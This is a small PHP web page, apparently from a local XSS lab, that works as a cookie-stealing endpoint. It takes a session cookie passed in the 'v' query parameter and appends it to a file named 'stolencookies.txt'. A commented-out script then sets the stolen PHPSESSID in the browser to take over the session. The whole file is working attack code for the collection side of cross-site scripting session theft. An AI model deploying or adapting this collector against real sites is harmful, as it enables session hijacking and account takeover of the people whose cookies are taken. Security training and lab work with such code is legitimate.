<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get a cookie</title>
</head>

<body>
    <h3>Get a cookie</h3>

<?php
	// Check if 'value' parameter is passed via GET
	// https://localhost/passman/xss/getcookie.php?v=PHPSESSID=o1mg400lipd2mck69kpfnl6p5s

	if (isset($_GET['v'])) {
		$stolen_cookie = $_GET['v'];  // Retrieve the value from the GET parameter

		// Define the file path where the value will be stored
		$file = 'stolencookies.txt';

		// Append the value to the file (or create it if it doesn't exist)
		file_put_contents($file, $stolen_cookie . PHP_EOL, FILE_APPEND);

		echo "Value has been saved successfully!";
	} else {
		echo "No value received via GET query string.";
	}

	// Set cookie manually for debugging:
	//$stolen_cookie = "PHPSESSID=o1mg400lipd2mck69kpfnl6p5s";
?>
<!--
	<script>
		let expires = new Date();
		//expires.setTime(expires.getTime());  // cookie expires now
		//expires.setTime(expires.getTime() + (30 * 24 * 60 * 60 * 1000));  // 30 days from now
		expires.setTime(expires.getTime() + (120 * 1000));  // 2 mins from now
		document.cookie = <?php echo '"' . $stolen_cookie . '"' ?> + "; path=/; expires=" + expires.toUTCString() + "; Secure; SameSite=Strict";

		// Check if cookies are set using console.log
		console.log(document.cookie);
	</script>
-->

</body>
</html>